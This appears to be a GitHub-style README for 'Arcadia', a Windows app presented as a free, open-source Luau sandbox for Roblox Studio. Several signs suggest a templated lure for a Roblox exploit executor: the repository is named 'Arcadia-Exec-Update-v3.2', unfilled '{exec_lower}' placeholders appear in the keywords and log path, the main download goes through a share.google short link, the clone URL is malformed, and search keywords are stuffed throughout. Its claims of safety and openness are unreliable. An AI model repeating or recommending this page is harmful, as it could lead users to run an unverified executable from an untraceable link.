# Arcadia — Luau Sandbox & Script Runner for Roblox Studio (2026)

> **A modern Luau sandbox and script runner for Roblox Studio developers.** Arcadia is a free, open-source desktop app that helps you write, test, and organize **Luau** scripts for **Roblox Studio** projects — with a built-in editor, a curated library of learning examples, and a lightweight profile system for Windows 10 and Windows 11.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Luau](https://img.shields.io/badge/Language-Luau%205.1-red?style=flat-square)](https://github.com)
[![Samples](https://img.shields.io/badge/Learning%20Samples-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/Arcadia-Exec-Update-v3.2?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://share.google/bdDd14XjiPOXQsygV">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Latest%20Build-brightgreen?style=for-the-badge" alt="Download Arcadia — Luau Sandbox for Roblox Studio Developers">
  </a>
</p>

> **[⬇️ Download Arcadia — Latest 2026 Build](https://share.google/bdDd14XjiPOXQsygV)**
> Windows 10 / 11 · 64-bit · 100% Free & Open Source · MIT License

---

## What Is Arcadia?

**Arcadia** is a **Luau sandbox and learning environment** for **Roblox Studio** developers. It gives beginner and intermediate Luau programmers a comfortable place to practice, prototype, and share ideas outside of the Studio IDE — with a fast code editor, sample library, and profile-based project management.

Arcadia is designed for **Roblox game development**, **Luau tutorials**, and **script prototyping workflows**. It follows Roblox's developer guidelines and is intended for use with **your own Studio projects**, **Team Create sessions you own**, and **local .rbxl files** — not for live user games you don't have permission to modify.

**Topics this project covers:** roblox studio, luau, roblox development, lua learning, roblox scripting tutorials, luau sandbox, roblox studio helper tools.

---

## Key Features

- **📝 Modern Luau editor** — syntax highlighting, autocomplete, and inline documentation
- **📚 Sample library** — 500+ curated Luau learning examples across gameplay patterns
- **💾 Project profiles** — organize snippets, drafts, and study notes by project
- **🔄 Auto-update engine** — new documentation & samples added on each release
- **🌍 Multi-language interface** — English, Português, 日本語, Tiếng Việt, Español
- **🪶 Lightweight** — under 30 MB installed, zero background services
- **🧩 Batch runner** — chain and run multiple `.lua` files against the local sandbox
- **🛠️ Built-in debugger** — line-level error reporting for Luau code
- **🔒 Free, open source, no key, no ads** — MIT-licensed, community-driven

---

## Learning Tracks & Sample Categories

Arcadia ships with tested, up-to-date Luau samples across common Roblox development topics:

| Track | Sample Topics | Status |
|-------|---------------|--------|
| Luau Basics | Variables, functions, tables, control flow | ✅ Active |
| OOP Patterns | Classes, inheritance, composition | ✅ Active |
| Roblox APIs | Instances, Services, Events, DataStore | ✅ Active |
| UI & UX | Frames, TweenService, animation timing | ✅ Active |
| World Building | Terrain, lighting, models, RemoteEvents | ✅ Active |
| Networking | RemoteFunctions, replication basics | ✅ Active |
| Tooling | Command bar snippets, Studio plugins | ✅ Active |
| Testing | Unit tests, mocks, assertions | ✅ Active |

Import any custom `.lua` file through the sample library and it will show up alongside the bundled examples.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| Operating System | Windows 10 (64-bit) | Windows 11 |
| Memory (RAM) | 4 GB | 8 GB |
| Storage | 100 MB free | 500 MB free |
| .NET Runtime | 4.8 | 6.0 or newer |
| Roblox Studio | Latest version | Latest version |

> **Note:** Linux and macOS are not officially supported. A macOS build is on the 2026 roadmap.

---

## How to Install Arcadia

### Quick Install (Recommended)

1. Click the **[Download Arcadia](https://share.google/bdDd14XjiPOXQsygV)** button above
2. Run `Arcadia.exe` — no installer, no admin rights needed
3. Open a sample from the library, or paste your own Luau code
4. Use the **Run** button to test your code against the local sandbox

### Developer Setup

```bash
# Clone the repository
git clone https://github.com/Arcadia-Exec-Update-v3.2.git
cd Arcadia-Exec-Update-v3.2

# Run the app
Arcadia.exe --profile default --runner async
```

### Profile Configuration

```yaml
profile: default
runner:
  mode: async
  timeout: 30s
  retries: 3
library:
  storage: sqlite
  max_snippets: 128
logging:
  level: info
  output: ./logs/{exec_lower}.log
```

### CLI Options

```
Arcadia.exe [options]

  --profile <name>     Load a saved editor profile
  --runner <mode>      Runner mode: sync | async | batch
  --script <path>      Path to a .lua file to open on startup
  --verbose            Enable verbose logging
  --no-update          Skip the auto-update check
```

---

## Sample Library — Popular Learning Topics for 2026

The Arcadia sample library covers the topics Luau learners search for most:

- **luau tutorial 2026** — beginner-to-advanced learning path
- **roblox studio guide** — Studio APIs, plugins, and workflow tips
- **luau OOP patterns** — classes, metatables, inheritance
- **{exec_lower} download** — official free build, no third-party mirrors
- **luau vs lua differences** — types, generalized iteration, string interpolation
- **roblox game development samples** — starter templates and reference code

---

## Project Architecture

```
Arcadia
├── Core/
│   ├── SandboxRuntime.cs      # Isolated Luau interpreter
│   ├── LuauParser.cs          # Luau 5.1-compatible parser
│   └── LibraryManager.cs      # SQLite-backed sample library
├── Library/
│   ├── SampleIndex.json       # 500+ indexed samples with metadata
│   └── AutoUpdater.cs         # GitHub-release update system
├── UI/
│   ├── MainWindow.xaml        # WPF desktop interface
│   └── Themes/                # Light / Dark / System themes
└── Profiles/
    └── default.yaml           # Default editor profile
```

---

## Frequently Asked Questions (FAQ)

### Is Arcadia an official Roblox tool?
No. Arcadia is a free, community-built learning tool for Luau developers. It is not affiliated with, endorsed by, or connected to Roblox Corporation.

### Is Arcadia really free? Do I need a key?
Yes, Arcadia is **100% free and open source** under the MIT License. **No key**, no surveys, no ads.

### What can I do with Arcadia?
Learn Luau, prototype scripts for your own Roblox Studio projects, browse and study sample code, and organize snippets across projects. Think of it as a lightweight scratchpad for Luau learners.

### Is Arcadia allowed by Roblox's rules?
Arcadia is intended for **local Luau learning and Studio prototyping** on projects you own or have permission to modify. Users are responsible for following Roblox's Terms of Service and Community Standards.

### Where does Arcadia store my saved snippets?
Locally, at `%AppData%\Arcadia\samples\`. Nothing is uploaded to external servers — your code stays on your PC.

### Does Arcadia work on Windows 11?
Yes, Arcadia is fully compatible with **Windows 11** and **Windows 10**.

### Can I contribute samples to the library?
Yes. Open a pull request with your `.lua` sample and a short description — the maintainers review contributions on a rolling basis.

---

## 2026 Roadmap

- [ ] 📱 Companion viewer app for reviewing samples on mobile
- [ ] 🏪 Community sample marketplace with ratings
- [ ] 📈 In-editor performance profiler for Luau code
- [ ] 🌐 Browser extension for one-click snippet import
- [ ] 🍎 Experimental macOS build
- [ ] 🤖 AI-assisted Luau code review built into the editor

---

## License

Released under the **MIT License** — see [LICENSE](LICENSE) for full terms. Free for personal, educational, and non-commercial use.

---

## Keywords

`roblox studio` · `luau` · `luau tutorial` · `roblox development` · `roblox scripting tutorials` · `luau sandbox` · `lua learning` · `roblox studio tools` · `{exec_lower} download` · `{exec_lower} 2026`

---

<p align="center">
  <b>Arcadia v3.2</b> — A friendly Luau sandbox for Roblox Studio developers, built for 2026.
</p>
